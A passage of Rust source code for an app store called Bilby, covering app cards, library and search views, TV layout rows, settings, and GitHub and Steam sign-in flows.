            if latest.load(Ordering::SeqCst) == generation {
                if let Some(ui) = weak.upgrade() {
                    ui.global::<Store>().set_toast(SharedString::new());
                }
            }
        });
    }

    // ---- cards ----

    /// The card for a listing. Something for adults is covered: see [`covered`].
    pub fn card(&self, app: &AppSummary) -> AppCard {
        // (Read and let go of at once: the card itself looks at the state again.)
        let uncovered = {
            let state = self.state.lock().unwrap();
            state.settings.adult_uncovered && !state.settings.family_mode
        };
        if app.adult && !uncovered {
            return covered(&app.id.to_string());
        }
        // Shown as it is: then it is a card like any other.
        let mut card = self.card_open(app);
        card.adult = false;
        card
    }

    /// The card as it is, for the app's own page.
    fn card_open(&self, app: &AppSummary) -> AppCard {
        let id = app.id.to_string();
        let popularity = match (app.popularity, app.id.source) {
            // A count of nothing is left out: it reads as a verdict, and is usually just
            // an app nobody has got round to starring.
            (Some(0), _) | (None, _) => String::new(),
            (Some(n), SourceKind::GitHub | SourceKind::Codeberg | SourceKind::GitLab) => {
                format!("{} stars", human_count(n))
            }
            (Some(n), SourceKind::Flathub | SourceKind::Homebrew) => format!("{} installs a month", human_count(n)),
            (Some(n), SourceKind::Aur) => format!("{} votes", human_count(n)),
            (Some(n), SourceKind::Steam) => format!("{} recommendations", human_count(n)),
            _ => String::new(),
        };
        let downloads = match app.downloads {
            Some(n) if n > 0 => format!("{} downloads", human_count(n)),
            _ => String::new(),
        };
        // Downloads say "people use this" in words everyone knows; stars need explaining.
        let headline = if downloads.is_empty() { popularity.clone() } else { downloads.clone() };
        let rating = app.rating.or_else(|| self.catalog().rating_for(&app.id));
        // The one figure a tile always shows: what people think of it, else how many
        // use it, and what it costs where it costs anything.
        let price = if self.owns(&app.id) { "Owned".to_string() } else { app.price.clone().unwrap_or_default() };
        let mut stat = match rating {
            Some(r) => format!("★ {}  ·  {}", bilby_core::ratings::stars_text(r), ratings_text(r.count)),
            None => headline.clone(),
        };
        if !price.is_empty() {
            stat = if stat.is_empty() { price.clone() } else { format!("{price}  ·  {stat}") };
        }
        if let Some(url) = &app.icon_url {
            self.icon_urls.lock().unwrap().insert(id.clone(), url.clone());
        }
        // In the store's library, or already installed by the system's package manager.
        let installed = self.state.lock().unwrap().installed(&id).is_some()
            || app.installed_version.is_some()
            || self.installed_elsewhere(&app.id, &app.name);
        let has_update = matches!(self.updates.lock().unwrap().get(&id), Some(UpdateStatus::Available { .. }));
        AppCard {
            adult: app.adult,
            stat: stat.into(),
            tint: tint_for(&id),
            icon: picture_for(&id),
            id: id.into(),
            name: app.name.clone().into(),
            author: app.author.clone().into(),
            summary: app.summary.clone().into(),
            // A repository package says which repository; the rest say which service.
            source: app.origin.clone().unwrap_or_else(|| app.id.source.label().to_string()).into(),
            badge: app.install_label.clone().unwrap_or_default().into(),
            version: app.version.clone().unwrap_or_default().into(),
            popularity: popularity.into(),
            initials: initials(&app.name).into(),
            installed,
            rating: rating.map(bilby_core::ratings::stars_text).unwrap_or_default().into(),
            rating_count: rating.map(|r| ratings_text(r.count)).unwrap_or_default().into(),
            rating_spread: rating.map(spread_shares).unwrap_or_default(),
            // A forge counts the files of the releases it listed; Flathub counts every install.
            downloads_note: if app.id.source == SourceKind::Flathub { "in total" } else { "of recent versions" }.into(),
            downloads: downloads.into(),
            price: price.into(),
            headline: headline.into(),
            verified: app.verified,
            more_sources: 0,
            has_update: installed && has_update,
        }
    }

    fn cards(&self, apps: &[AppSummary]) -> ModelRc<AppCard> {
        ModelRc::new(VecModel::from(apps.iter().map(|a| self.card(a)).collect::<Vec<_>>()))
    }

    fn library_card(&self, app: &InstalledApp) -> AppCard {
        let update = self.updates.lock().unwrap().get(&app.id).cloned();
        let (version, has_update) = match update {
            Some(UpdateStatus::Available { version, .. }) => (format!("{} → {version}", app.version), true),
            _ => (app.version.clone(), false),
        };
        AppCard {
            id: app.id.as_str().into(),
            name: app.name.as_str().into(),
            author: app.author.as_str().into(),
            summary: app.summary.as_str().into(),
            source: AppId::parse(&app.id).map(|id| id.source.label()).unwrap_or("").into(),
            badge: app.label.as_str().into(),
            version: version.into(),
            popularity: SharedString::new(),
            initials: initials(&app.name).into(),
            tint: tint_for(&app.id),
            icon: if self.store_app.as_ref().is_some_and(|own| own.to_string().eq_ignore_ascii_case(&app.id)) {
                own_icon()
            } else {
                picture_for(&app.id)
            },
            installed: true,
            rating: SharedString::new(),
            rating_count: SharedString::new(),
            rating_spread: ModelRc::default(),
            downloads: SharedString::new(),
            downloads_note: SharedString::new(),
            price: SharedString::new(),
            headline: SharedString::new(),
            verified: false,
            adult: false,
            stat: SharedString::new(),
            more_sources: 0,
            has_update,
        }
    }

    fn favourite_card(&self, favourite: &Favourite) -> AppCard {
        let state = self.state.lock().unwrap();
        let installed = state.installed(&favourite.id);
        AppCard {
            id: favourite.id.as_str().into(),
            name: favourite.name.as_str().into(),
            author: favourite.author.as_str().into(),
            summary: favourite.summary.as_str().into(),
            source: AppId::parse(&favourite.id).map(|id| id.source.label()).unwrap_or("").into(),
            badge: SharedString::new(),
            version: installed.map(|a| a.version.clone()).unwrap_or_default().into(),
            popularity: SharedString::new(),
            initials: initials(&favourite.name).into(),
            tint: tint_for(&favourite.id),
            icon: picture_for(&favourite.id),
            installed: installed.is_some(),
            rating: SharedString::new(),
            rating_count: SharedString::new(),
            rating_spread: ModelRc::default(),
            downloads: SharedString::new(),
            downloads_note: SharedString::new(),
            price: SharedString::new(),
            headline: SharedString::new(),
            verified: false,
            adult: false,
            stat: SharedString::new(),
            more_sources: 0,
            has_update: false,
        }
    }

    // ---- pages ----

    /// Discover, the TV rows and the library all depend on the same data; redraw them
    /// together so "Installed" and "Update" markers never disagree between pages.
    pub fn refresh(&self, ui: &AppWindow) {
        let store = ui.global::<Store>();
        // The bundled starter list first, then the lists the sources keep themselves.
        let mut featured = self.catalog().featured();
        featured.extend(self.collections.lock().unwrap().iter().cloned());
        let to_sections = |list: &[CoreSection]| -> Vec<Section> {
            list.iter().map(|s| Section { title: s.title.clone().into(), apps: self.cards(&s.apps) }).collect()
        };
        store.set_sections(ModelRc::new(VecModel::from(to_sections(&featured))));
        store.set_categories(ModelRc::new(VecModel::from(
            // The rows of web apps by purpose are rows, not filters: one chip stands for them.
            featured
                .iter()
                .filter(|s| !s.title.starts_with("Web apps "))
                .map(|s| SharedString::from(&s.title))
                .collect::<Vec<_>>(),
        )));
        if !featured.iter().any(|s| s.title == store.get_category().as_str()) {
            store.set_category(SharedString::new());
        }
        store.set_spotlight(featured.first().and_then(|s| s.apps.first()).map(|a| self.card(a)).unwrap_or_default());

        let state = self.state();
        let updates = self.updates.lock().unwrap().clone();
        let now = now_unix();
        let mut rows: Vec<LibraryRow> = state
            .library
            .iter()
            .map(|app| {
                // Entries that came from a backup or an older file have no install time.
                let date =
                    if app.installed_at == 0 { String::new() } else { age_label(&unix_date(app.installed_at), now) };
                // The kind of file is on the app's page; here the version and age are enough.
                let mut detail = app.version.clone();
                if !date.is_empty() {
                    detail.push_str(&format!("  ·  installed {date}"));
                }
                let (status, status_text) = match updates.get(&app.id) {
                    None => (0, String::new()),
                    Some(UpdateStatus::UpToDate) if !app.skipped_version.is_empty() => {
                        (2, format!("Up to date  ·  skipping {}", app.skipped_version))
                    }
                    Some(UpdateStatus::UpToDate) => (2, "Up to date".to_string()),
                    Some(UpdateStatus::Available { version, .. }) => (3, format!("Update available: {version}")),
                    Some(UpdateStatus::Unknown(why)) => (4, format!("Couldn't check: {why}")),
                };
                LibraryRow {
                    card: self.library_card(app),
                    detail: detail.into(),
                    status,
                    status_text: status_text.into(),
                    store_managed: app.store_managed,
                }
            })
            .collect();
        // Apps with an update waiting come first; otherwise most recently installed first.
        rows.sort_by_key(|r| r.status != 3);
        let update_count = rows.iter().filter(|r| r.status == 3).count();
        store.set_updates_count(update_count as i32);
        store.set_library(ModelRc::new(VecModel::from(rows)));
        let favourites: Vec<AppCard> = state.favourites.iter().map(|f| self.favourite_card(f)).collect();
        store.set_favourites(ModelRc::new(VecModel::from(favourites)));
        store.set_is_favourite(state.is_favourite(store.get_app().id.as_str()));
        store.set_can_open(self.launchable(store.get_app().id.as_str()).is_some());
        store.set_in_library(state.installed(store.get_app().id.as_str()).is_some());
        let checked = self.last_checked.load(Ordering::SeqCst);
        store.set_last_checked(
            match now.saturating_sub(checked) {
                _ if checked == 0 => String::new(),
                s if s < 90 => "just now".to_string(),
                s if s < 3600 => format!("{} minutes ago", s / 60),
                s => format!("{} hours ago", s / 3600),
            }
            .into(),
        );
        store.set_recent(ModelRc::new(VecModel::from(
            state.recent_searches.iter().map(SharedString::from).collect::<Vec<_>>(),
        )));

        // Search results keep their markers in sync too.
        let (query, results) = self.results.lock().unwrap().clone();
        // The sources these results came from, for the filter under the search box.
        let mut found: Vec<(SourceKind, i32)> = Vec::new();
        for app in &results {
            match found.iter_mut().find(|(kind, _)| *kind == app.id.source) {
                Some((_, n)) => *n += 1,
                None => found.push((app.id.source, 1)),
            }
        }
        let filter = self.result_filter.lock().unwrap().filter(|kind| found.iter().any(|(k, _)| k == kind));
        store.set_source_filter(filter.map(|k| k.prefix()).unwrap_or_default().into());
        store.set_result_sources(ModelRc::new(VecModel::from(
            found
                .iter()
                .map(|(kind, n)| SourceChoice {
                    id: kind.prefix().into(),
                    label: kind.label().into(),
                    on: true,
                    count: *n,
                })
                .collect::<Vec<_>>(),
        )));
        // One app from several sources is one result; its page offers the sources.
        let groups = bilby_core::merge::group(results.clone());
        let mut alternates = HashMap::new();
        for group in groups.iter().filter(|g| !g.others.is_empty()) {
            let members: Vec<(String, String)> =
                group.members().map(|m| (m.id.to_string(), bilby_core::merge::source_label(m))).collect();
            for member in group.members() {
                alternates.insert(member.id.to_string(), members.clone());
            }
        }
        *self.alternates.lock().unwrap() = alternates;
        let cards: Vec<AppCard> = match filter {
            // Narrowed to one source, each entry is shown as that source has it.
            Some(kind) => results.iter().filter(|app| app.id.source == kind).map(|app| self.card(app)).collect(),
            None => groups
                .iter()
                .map(|group| {
                    let mut card = self.card(&group.lead);
                    card.more_sources = group.others.len() as i32;
                    card
                })
                .collect(),
        };
        let mut cards = cards;
        if filter.is_none() {
            let available = self.catalog().available_sources();
            let families = bilby_core::related::families();
            if let Some(family) = bilby_core::related::family_named(families, &query) {
                let platform = self.platform.read().unwrap().clone();
                let here = family.here(&available, &platform);
                if let Some(first) = here.first().and_then(|m| AppId::parse(&m.id).map(|id| (id, *m))) {
                    // One tile for the service; its versions are chosen on its page.
                    // The tile stands for the family's first choice here; its other
                    // members stay in the results as themselves, ranked as near matches.
                    cards.retain(|card| !card.id.as_str().eq_ignore_ascii_case(&first.1.id));
                    let mut app = AppSummary::new(first.0, family.name.clone());
                    app.summary = match here.len() {
                        1 => first.1.note.clone(),
                        n => format!("{n} versions work on this device. Choose one on its page."),
                    };
                    app.author = "Choose a version on its page".to_string();
                    let mut card = self.card(&app);
                    card.more_sources = 0;
                    card.stat =
                        if here.len() > 1 { format!("{} versions", here.len()).into() } else { SharedString::new() };
                    card.headline =
                        if here.len() > 1 { format!("{} versions", here.len()).into() } else { SharedString::new() };
                    cards.insert(0, card);
                }
            }
        }
        // Everything for adults goes to the end of the list, covered.
        let (mut cards, adult): (Vec<AppCard>, Vec<AppCard>) = cards.into_iter().partition(|card| !card.adult);
        cards.extend(adult);
        let found = cards.clone();
        store.set_results(ModelRc::new(VecModel::from(cards)));
        self.show_app_sources(ui);

        // TV: the Library page has updates first, then the rest, then favourites.
        let section = |title: &str, cards: Vec<AppCard>| Section {
            title: title.into(),
            apps: ModelRc::new(VecModel::from(cards)),
        };
        let (waiting, current): (Vec<AppCard>, Vec<AppCard>) =
            state.library.iter().map(|a| self.library_card(a)).partition(|card| card.has_update);
        let mut tv_library = Vec::new();
        // The device itself and the store come first: what they run and whether
        // either has an update, whoever installed what.
        let mut device = Vec::new();
        if store.get_system_supported() || !store.get_system_name().is_empty() {
            device.push(AppCard {
                id: SYSTEM_CARD.into(),
                name: if store.get_system_name().is_empty() {
                    store.get_device_name()
                } else {
                    store.get_system_name()
                },
                author: "This device's own software".into(),
                summary: store.get_system_headline(),
                has_update: store.get_system_state() == 3,
                installed: true,
                tint: tint_for(SYSTEM_CARD),
                ..Default::default()
            });
        }
        if !device.is_empty() {
            tv_library.push(section(&store.get_device_name(), device));
        }
        if !waiting.is_empty() {
            tv_library.push(section("Updates available", waiting));
        }
        if !current.is_empty() {
            tv_library.push(section("Installed with Bilby", current));
        }
        // Everything else on the device, however it got there.
        let others: Vec<AppCard> = self
            .elsewhere
            .read()
            .unwrap()
            .apps
            .iter()
            .filter(|(id, _)| state.installed(id).is_none())
            .map(|(id, name)| AppCard {
                id: id.as_str().into(),
                name: name.as_str().into(),
                source: AppId::parse(id).map(|id| id.source.label()).unwrap_or("").into(),
                author: AppId::parse(id).map(|id| id.source.label()).unwrap_or("").into(),
                installed: true,
                tint: tint_for(id),
                icon: picture_for(id),
                ..Default::default()
            })
            .collect();
        if !others.is_empty() {
            tv_library.push(section("Also installed here", others));
        }
        if !state.favourites.is_empty() {
            tv_library.push(section("Favourites", state.favourites.iter().map(|f| self.favourite_card(f)).collect()));
        }
        store.set_tv_library_rows(ModelRc::new(VecModel::from(tv_library)));
        // TV home: search results, then the store.
        // TV: a search is the whole page. The likeliest few first, then the rest by
        // kind, so a game is not buried under packages or the other way round.
        let mut tv = Vec::new();
        if found.is_empty() {
            tv.extend(to_sections(&featured));
        } else {
            const TOP: usize = 6;
            // Things for adults are never among the top results or the other rows:
            // they have a row of their own, last, each one covered.
            let (adult, found): (Vec<AppCard>, Vec<AppCard>) = found.into_iter().partition(|card| card.adult);
            let top: Vec<AppCard> = found.iter().take(TOP).cloned().collect();
            if !top.is_empty() {
                tv.push(Section {
                    title: format!("Top results for “{query}”").into(),
                    apps: ModelRc::new(VecModel::from(top)),
                });
            }
            for kind in
                ["Apps", "Games", "Web apps", "From your own sources", "From developers", "System packages", "Adult"]
            {
                let of_kind: Vec<AppCard> = if kind == "Adult" {
                    adult.clone()
                } else {
                    found.iter().skip(TOP).filter(|card| kind_of(card.id.as_str()) == kind).take(24).cloned().collect()
                };
                if !of_kind.is_empty() {
                    tv.push(Section { title: kind.into(), apps: ModelRc::new(VecModel::from(of_kind)) });
                }
            }
        }
        store.set_tv_rows(ModelRc::new(VecModel::from(tv)));
    }

    fn refresh_settings(&self, ui: &AppWindow) {
        let store = ui.global::<Store>();
        let settings = self.state().settings;
        store.set_theme_mode(theme_mode(&settings.theme));
        store.set_include_prereleases(settings.include_prereleases);
        store.set_show_ratings(!settings.hide_ratings);
        store.set_check_updates_on_start(!settings.skip_update_check_on_start);
        store.set_has_token(!settings.github_token.trim().is_empty());
        store.set_sounds(!settings.mute_sounds);
        store.set_show_essentials(!settings.hide_essentials);
        store.set_prefer_kind(bilby_core::compat::Prefer::named(&settings.prefer_kind).number());
        store.set_prefer_applies(self.platform.read().unwrap().os == bilby_core::platform::Os::Linux);
        store.set_own_sources(ModelRc::new(VecModel::from(
            settings
                .own_sources
                .iter()
                .map(|own| SourceChoice {
                    id: own.url.as_str().into(),
                    label: own.name.as_str().into(),
                    on: true,
                    count: 0,
                })
                .collect::<Vec<_>>(),
        )));
        store.set_family_mode(settings.family_mode);
        store.set_adult_on_home(settings.adult_on_home);
        store.set_adult_uncovered(settings.adult_uncovered);
        store.set_has_pin(!settings.pin_hash.is_empty());
        store.set_pin_for_installs(settings.pin_for_installs);
        let steam = self.steam.read().unwrap().clone();
        // Steam is a desktop program: its library is offered wherever it runs.
        let os = self.platform.read().unwrap().os;
        store.set_steam_available(matches!(os, Os::Windows | Os::MacOs | Os::Linux));
        store.set_steam_signed_in(steam.is_some());
        store.set_steam_summary(steam.map(|a| format!("{} games and tools", a.owned.len())).unwrap_or_default().into());
        store.set_downloads_dir(self.downloads_folder().display().to_string().into());
        store.set_downloads_custom(!settings.downloads_dir.trim().is_empty());
        store.set_ask_where(settings.ask_where);
        store.set_show_welcome(!settings.welcomed);
        store.set_interface_mode(interface_mode(&settings.interface));
        store.set_sources(ModelRc::new(VecModel::from(
            self.catalog()
                .available_sources()
                .into_iter()
                .map(|kind| SourceChoice {
                    id: kind.prefix().into(),
                    label: kind.label().into(),
                    on: !settings.disabled_sources.iter().any(|name| name == kind.prefix()),
                    count: 0,
                })
                .collect::<Vec<_>>(),
        )));
        ui.global::<Theme>().set_reduce_motion(settings.reduce_motion);
        store.set_can_register(self.self_program.is_some());
        store.set_in_menu(self.self_program.is_some() && install::self_entry_path(&self.dirs).is_file());
        self.refresh_quota(ui);
    }

    /// Show how much of GitHub's hourly allowance is left, once GitHub has told us.
    fn refresh_quota(&self, ui: &AppWindow) {
        let text = self.catalog().quota().map(|q| q.describe(now_unix())).unwrap_or_default();
        ui.global::<Store>().set_quota_text(text.into());
    }

    fn rebuild_catalog(&self) {
        let settings = self.state().settings;
        let fresh = (self.catalog_factory)(&self.platform.read().unwrap(), &settings, &self.dirs);
        // Ratings fetched earlier stay; the factory hands back a shared catalog, so the
        // old one's are passed on only where that is possible.
        let old = self.catalog();
        let fresh = match Arc::try_unwrap(fresh) {
            Ok(mut catalog) => {
                catalog.share_ratings_with(&old);
                Arc::new(catalog)
            }
            Err(shared) => shared,
        };
        *self.catalog.write().unwrap() = fresh;
    }

    /// Use the desktop or the TV layout, now and from the next start on. `mode` is 0 to
    /// let the store decide, 1 for desktop, 2 for TV.
    pub fn set_interface(self: &Arc<Self>, ui: &AppWindow, mode: i32) {
        let name = ["", "desktop", "tv"].get(mode as usize).copied().unwrap_or("");
        self.update_state(ui, |state| {
            state.settings.interface = name.to_string();
            // Having chosen is an answer to the question, too.
            state.settings.asked_about_tv = true;
        });
        let form = form_for(name, self.detected);
        let changed = {
            let mut platform = self.platform.write().unwrap();
            let changed = platform.form_factor != form;
            platform.form_factor = form;
            changed
        };
        let store = ui.global::<Store>();
        store.set_ask_tv(false);
        store.set_shell(shell_for(form));
        store.set_adaptive(form != FormFactor::Tv);
        // A TV has no use for window borders; a desktop wants them back.
        if !self.inline {
            ui.window().set_fullscreen(form == FormFactor::Tv);
        }
        // The TV layout is designed dark; elsewhere the chosen theme applies.
        let theme = self.theme_override.clone().unwrap_or_else(|| self.state().settings.theme);
        ui.global::<Theme>().set_mode(if form == FormFactor::Tv { 2 } else { theme_mode(&theme) });
        store.set_page(0);
        store.set_details_open(false);
        if changed {
            // What suits a TV differs (TV builds first, websites on Linux), so the lists
            // are fetched again for the new shape.
            self.rebuild_catalog();
            self.collections.lock().unwrap().clear();
            self.load_collections(ui);
            let platform = self.platform.read().unwrap().clone();
            store.set_platform_title(platform.title().into());
            store.set_device_name(platform.friendly().into());
            self.refresh(ui);
        }
        self.refresh_settings(ui);
    }

    /// Put the open app's sources beside its button, when it has more than one.
    fn show_app_sources(&self, ui: &AppWindow) {
        let store = ui.global::<Store>();
        let id = store.get_app().id.to_string();
        let choices: Vec<SourceChoice> = self
            .alternates
            .lock()
            .unwrap()
            .get(&id)
            .map(|members| {
                members
                    .iter()
                    .map(|(app, label)| SourceChoice {
                        id: app.as_str().into(),
                        label: label.as_str().into(),
                        on: *app == id,
                        count: 0,
                    })
                    .collect()
            })
            .unwrap_or_default();
        store.set_app_sources(ModelRc::new(VecModel::from(choices)));

        // The app as one version of a service (VacuumTube, of YouTube): the versions
        // this device can use, to choose between.
        let available = self.catalog().available_sources();
        let families = bilby_core::related::families();
        let family = bilby_core::related::family_of(families, &id);
        // One entry per app, however many sources have it: the one being shown, or
        // the first this device can use.
        let device = self.platform.read().unwrap().clone();
        let here = family.map(|family| family.here(&available, &device)).unwrap_or_default();
        let showing = here.iter().find(|m| m.id.eq_ignore_ascii_case(&id)).map(|m| m.label.as_str());
        // The service's own app lists its child apps. A child names its parent, once,
        // and lists no siblings: they are reached from the parent.
        let (parent, children) =
            family.map(|family| family.parent_and_children(&available, &device)).unwrap_or((None, Vec::new()));
        let on_parent = parent.is_some_and(|p| p.id.eq_ignore_ascii_case(&id));
        let as_choice = |member: &bilby_core::related::Member| VersionChoice {
            id: member.id.as_str().into(),
            name: member.label.as_str().into(),
            note: member.note.as_str().into(),
            official: member.official,
            on: false,
        };
        let versions: Vec<VersionChoice> =
            if on_parent { children.iter().map(|m| as_choice(m)).collect() } else { Vec::new() };
        let parents: Vec<VersionChoice> = match parent {
            Some(p) if family.is_some() && !on_parent => vec![as_choice(p)],
            _ => Vec::new(),
        };
        // The other sources of the app being shown, when a search has not already said.
        if store.get_app_sources().row_count() == 0 {
            let same: Vec<SourceChoice> = here
                .iter()
                .filter(|m| showing == Some(m.label.as_str()))
                .filter_map(|m| {
                    let source = AppId::parse(&m.id)?.source.label();
                    Some(SourceChoice {
                        id: m.id.as_str().into(),
                        label: source.into(),
                        on: m.id.eq_ignore_ascii_case(&id),
                        count: 0,
                    })
                })
                .collect();
            if same.len() > 1 {
                store.set_app_sources(ModelRc::new(VecModel::from(same)));
            }
        }
        store.set_app_family_name(family.map(|f| f.name.as_str()).unwrap_or_default().into());
        store.set_app_family(ModelRc::new(VecModel::from(versions)));
        store.set_app_parent(ModelRc::new(VecModel::from(parents)));

        // A Steam game without Steam: offer Steam itself, from wherever this device gets it.
        let mut helper = (String::new(), String::new());
        if id.starts_with("steam:") {
            use bilby_core::source::steam;
            let platform = self.platform.read().unwrap().clone();
            let libraries = self.steam_libraries.clone().unwrap_or_else(|| steam::default_libraries(platform.os));
            if libraries.is_empty() {
                if let Some(steam_app) = steam::steam_itself(&platform, &available) {
                    helper = (steam_app.to_string(), "Install Steam".to_string());
                }
            }
        }
        // An AppImage on a system that lacks what AppImages need to start: said before
        // it is downloaded, with the package that provides it one press away.
        let mut need_note = String::new();
        let mut needed = None;
        if helper.0.is_empty() {
            let placed = self.launchable(&id).and_then(|path| bilby_core::needs::as_appimage(&path));
            let offered = store.get_options().row_data(0).is_some_and(|option| option.label.contains("AppImage"));
            if placed.is_some() || offered {
                let platform = self.platform.read().unwrap().clone();
                let catalog = self.catalog();
                let in_repositories = |package: &AppId| catalog.source_summary(package).is_ok();
                if let Some(need) = bilby_core::needs::for_appimage(
                    &platform,
                    *self.fuse.read().unwrap(),
                    placed.as_deref(),
                    &in_repositories,
                ) {
                    need_note = need.why;
                    // Installed along with the app, or just before it is opened: the
                    // person is told, not sent to fetch it.
                    needed = need.package;
                    // A read-only system takes it on top of its image, from a restart on.
                    if self.layering.is_some() {
                        needed = None;
                        need_note = match self.fuse_staged.load(Ordering::SeqCst) {
                            true => "FUSE 2, which this app needs to run, has been added to this system and starts working after a restart.".to_string(),
                            false => "This app needs FUSE 2 to run, which this system does not have. Bilby will add it to your system for you; it starts working after a restart, which Bilby will offer.".to_string(),
                        };
                    }
                }
            }
        }
        self.lacks_fuse.store(!need_note.is_empty(), Ordering::SeqCst);
        store.set_need_note(need_note.into());
        *self.needed.lock().unwrap() = needed;
        // The same choices as rows for the TV, without the one already showing.
        let mut rows: Vec<SourceChoice> = Vec::new();
        for parent in store.get_app_parent().iter() {
            let whose = if parent.official { "" } else { "  ·  unofficial" };
            rows.push(SourceChoice {
                id: parent.id,
                label: format!("Parent app: {}{whose}", parent.name).into(),
                on: false,
                count: 0,
            });
        }
        for child in store.get_app_family().iter() {
            let whose = if child.official { "" } else { "  ·  unofficial" };
            rows.push(SourceChoice {
                id: child.id,
                label: format!("Child app: {}{whose}", child.name).into(),
                on: false,
                count: 0,
            });
        }
        for source in store.get_app_sources().iter().filter(|c| !c.on) {
            rows.push(SourceChoice { label: format!("Get it from {} instead", source.label).into(), ..source });
        }
        store.set_tv_choices(ModelRc::new(VecModel::from(rows)));
        store.set_helper_id(helper.0.into());
        store.set_helper_label(helper.1.into());
    }

    /// Sign in to GitHub with a code: show it, then wait for the person to enter it at
    /// GitHub. The token that comes back is kept exactly like a pasted one.
    pub fn github_signin(self: &Arc<Self>, ui: &AppWindow) {
        use bilby_core::github_login::{self, Poll};
        let generation = self.signin_generation.fetch_add(1, Ordering::SeqCst) + 1;
        let store = ui.global::<Store>();
        store.set_signin_code(SharedString::new());
        store.set_signin_state(1);
        self.job(
            |app| github_login::start(app.catalog().http().as_ref()),
            move |app, ui, started| {
                let store = ui.global::<Store>();
                if app.signin_generation.load(Ordering::SeqCst) != generation {
                    return;
                }
                let code = match started {
                    Ok(code) => code,
                    Err(e) => {
                        store.set_signin_state(0);
                        app.toast(ui, &format!("Could not start signing in: {e}"), true);
                        return;
                    }
                };
                store.set_signin_code(code.user_code.as_str().into());
                store.set_signin_state(2);
                app.job(
                    move |app| {
                        let http = app.catalog().http();
                        let started = std::time::Instant::now();
                        let mut interval = code.interval;
                        loop {
                            // Wait in short steps, so cancelling is noticed promptly.
                            let wait_until = std::time::Instant::now() + std::time::Duration::from_secs(interval);
                            while std::time::Instant::now() < wait_until {
                                if app.signin_generation.load(Ordering::SeqCst) != generation {
                                    return Ok(None);
                                }
                                std::thread::sleep(std::time::Duration::from_millis(200));
                            }
                            if app.signin_generation.load(Ordering::SeqCst) != generation {
                                return Ok(None);
                            }
                            match github_login::poll(http.as_ref(), &code)? {
                                Poll::Done(token) => return Ok(Some(token)),
                                Poll::Pending => {}
                                Poll::SlowDown(seconds) => interval = seconds,
                                Poll::Denied => {
                                    return Err(Error::Unsupported("Signing in was declined at GitHub.".into()))
                                }
                                Poll::Expired => {
                                    return Err(Error::Unsupported(
                                        "The code ran out before it was entered. Try again.".into(),
                                    ))
                                }
                            }
                            if started.elapsed().as_secs() > code.expires_in.max(60) {
                                return Err(Error::Unsupported(
                                    "The code ran out before it was entered. Try again.".into(),
                                ));
                            }
                        }
                    },
                    move |app, ui, outcome: bilby_core::Result<Option<String>>| {
                        if app.signin_generation.load(Ordering::SeqCst) != generation {
                            return;
                        }
                        let store = ui.global::<Store>();
                        store.set_signin_state(0);
                        store.set_signin_code(SharedString::new());
                        match outcome {
                            Ok(Some(token)) => {
                                app.update_state(ui, |state| state.settings.github_token = token);
                                app.rebuild_catalog();
                                app.refresh_settings(ui);
                                app.toast(ui, "Signed in to GitHub", false);
                            }
                            Ok(None) => {}
                            Err(e) => app.toast(ui, &e.to_string(), true),
                        }
                    },
                );
            },
        );
    }

    /// Does the signed-in Steam account own this app?
    pub fn owns(&self, id: &AppId) -> bool {
        id.source == SourceKind::Steam
            && self.steam.read().unwrap().as_ref().is_some_and(|account| account.owns_key(&id.key))
    }

    /// Sign in to Steam on Steam's own page, to learn what the account owns. On a TV
    /// the page is shown by Longboard, which a remote can drive; elsewhere in a small
    /// window of the store's own. Either way the store receives only the account's
    /// number and the ids of what it owns.
    pub fn steam_signin(self: &Arc<Self>, ui: &AppWindow) {
        let generation = self.steam_generation.fetch_add(1, Ordering::SeqCst) + 1;
        let store = ui.global::<Store>();
        let via_longboard = store.get_shell() == Shell::Tv;
        store.set_steam_state(if via_longboard { 2 } else { 1 });
        self.job(
            move |app| app.steam_ask(via_longboard, generation),
            move |app, ui, result| {
                if app.steam_generation.load(Ordering::SeqCst) != generation {
                    return;
                }
                ui.global::<Store>().set_steam_state(0);
                match result {
                    Ok(Some(account)) => app.steam_signed_in(ui, account),
                    // Closed, declined or cancelled: nothing changes.
                    Ok(None) => {}
                    Err(e) => app.toast(ui, &e.to_string(), true),
                }
            },
        );
    }

    /// What a finished Steam sign-in leaves behind, whichever way it was done.
    fn steam_signed_in(&self, ui: &AppWindow, account: bilby_core::steam_account::Account) {
        let count = account.owned.len();
        *self.steam.write().unwrap() = Some(account.clone());
        self.update_state(ui, |state| state.steam = Some(account));
        self.refresh_settings(ui);
        self.refresh(ui);
        self.toast(ui, &format!("Signed in to Steam. {count} games and tools are in your library."), false);
    }

    /// Sign in to Steam with a code: draw it, and wait for the person to scan it with
    /// the Steam app on their phone and approve there.
    pub fn steam_signin_qr(self: &Arc<Self>, ui: &AppWindow) {
        use bilby_core::steam_qr;
        let generation = self.steam_generation.fetch_add(1, Ordering::SeqCst) + 1;
        let store = ui.global::<Store>();
        store.set_steam_qr(slint::Image::default());
        store.set_steam_qr_scanned(false);
        store.set_steam_state(3);
        self.job(
            |app| steam_qr::start(app.catalog().http().as_ref(), "Bilby"),
            move |app, ui, started| {
                if app.steam_generation.load(Ordering::SeqCst) != generation {
                    return;
                }
                match started {
                    Ok(session) => {
                        ui.global::<Store>().set_steam_qr(code_image(&session.challenge_url));
                        app.steam_qr_wait(session, generation, std::time::Instant::now());
                    }
                    Err(e) => {
                        ui.global::<Store>().set_steam_state(0);
                        app.toast(ui, &format!("Could not start signing in to Steam: {e}"), true);
                    }
                }
            },
        );
    }

    /// Ask Steam once, after the wait it asks for, whether the code was approved; then
    /// show what changed and ask again.
    fn steam_qr_wait(
        self: &Arc<Self>,
        mut session: bilby_core::steam_qr::Session,
        generation: u64,
        since: std::time::Instant,
    ) {
        use bilby_core::steam_qr::{self, Poll};
        let shown = session.challenge_url.clone();
        self.job(
            move |app| {
                // Wait in short steps, so cancelling is noticed promptly.
                let until = std::time::Instant::now() + std::time::Duration::from_secs(session.interval);
                while std::time::Instant::now() < until && app.steam_generation.load(Ordering::SeqCst) == generation {
                    std::thread::sleep(std::time::Duration::from_millis(200));
                }
                if app.steam_generation.load(Ordering::SeqCst) != generation {
                    return (session, Ok(Poll::Expired));
                }
                let answer = steam_qr::poll(app.catalog().http().as_ref(), &mut session);
                (session, answer)
            },
            move |app, ui, (session, answer)| {
                if app.steam_generation.load(Ordering::SeqCst) != generation {
                    return;
                }
                let store = ui.global::<Store>();
                let stop = |message: &str| {
                    store.set_steam_state(0);
                    store.set_steam_qr(slint::Image::default());
                    app.toast(ui, message, true);
                };
                match answer {
                    Ok(Poll::Done(account)) => {
                        store.set_steam_state(0);
                        store.set_steam_qr(slint::Image::default());
                        app.steam_signed_in(ui, account);
                    }
